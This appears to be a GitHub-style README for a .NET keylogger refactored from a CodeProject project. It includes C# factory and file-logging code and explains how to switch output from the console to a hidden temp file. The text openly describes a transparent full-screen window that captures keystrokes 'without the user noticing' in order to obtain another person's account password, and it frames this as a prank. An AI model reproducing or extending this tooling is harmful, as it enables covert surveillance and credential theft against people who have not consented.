# Windows .Net Key Logger #

## Overview ##

A few years ago, around 2012 I guess, I was playing around with ideas for practical jokes with the [BlueScreen screen saver](http://www.wikihow.com/Pull-a-Prank-on-Windows). To do this I'd need access to the poor unsuspecting local users account password. But how... well, key logging seemed the most practical solution. After a number of Google searches on how to build key loggers I finally landed on [.Net Hookless Key-logger from CodeProject](http://www.codeproject.com/Articles/18890/NET-Hookless-Key-logger-Advanced-Keystroke-Mining).

Bingo. Unfortunately the .Net Hookless Key-logger project, as self-described, was a bit messy. I decided to do some cleanup of classes, extracting of interfaces to make the project more IoC friendly, and added a factory to create the key logger based on desired output types. To load the key logger there is a simple Windows desktop application with a maximized window state and a transparent background. When that application starts it will immediately overlay the entire screen, all without the user noticing, and begins mining any entered keys.

## Getting Started ##

By default the Windows application is configured so the `KeyloggerFactory` creates a `Keylogger` writing all the mined keys to the console window. Great for testing how the application is running, tweaking the key mining timings, but not great for actually saving any data.

```
private void frmMain_Load(object sender, EventArgs e)
{
    try
    {
        Logger = KeyloggerFactory.GetKeylogger(OutputType.Console);
    }
    catch
    {
        Close();
    }
}
```

To begin saving the mined keys to a data file simply change the output type from 'Console' to 'File' in the `KeyloggerFactory`.

```
Logger = KeyloggerFactory.GetKeylogger(OutputType.File);
```

The `KeyloggerFactory` factory will create a new instance of the `Keylogger` setting it to use the `FileDataLogger` class.

```
public class KeyloggerFactory
{
    public static Keylogger GetKeylogger(OutputType logType)
    {
        switch (logType)
        {
            case OutputType.Console:
                return new Keylogger(new ConsoleDataLogger());

            case OutputType.File:
                return new Keylogger(new FileDataLogger());
        }

        throw new NotImplementedException($"Logging type of {logType.ToString("G")} is not supported.");
    }
}
```

By default `FileDataLogger` creates a new temporary file each time the application is run by using the [`Path` class to create a new tempoary file](https://msdn.microsoft.com/en-us/library/system.io.path.gettempfilename.aspx). The `FileDataLogger` class could easily have a path provided to it, but the temporary file seemed less likely to have file access security risks.

```
public class FileDataLogger : IDataLogger
{
    private readonly string _filePath;

    public FileDataLogger()
    {
        _filePath = Path.GetTempFileName();
    }

    public void Write(string data)
    {
        using (var stream = new FileStream(_filePath, FileMode.Append, FileAccess.Write))
        {
            using (var writer = new StreamWriter(stream))
            {
                writer.Write(data);
            }
        }
    }
}
```

At this point the key logger is able to be run. You can call your buddy over to login to something using your computer. Afterwards let the shenanigans begin!

## Important Information ##

I take zero responsibility for how this code is used. I enjoyed learning about key loggers, refactoring, but be smart. Don't be a dick, and please do no real evil.

The original author licensed the code under [The Code Project Open License (CPOL)](http://www.codeproject.com/info/cpol10.aspx) with unrestricted access to modify or distribute the code. Same goes for the modifications that I have done. Do with them as you wish.
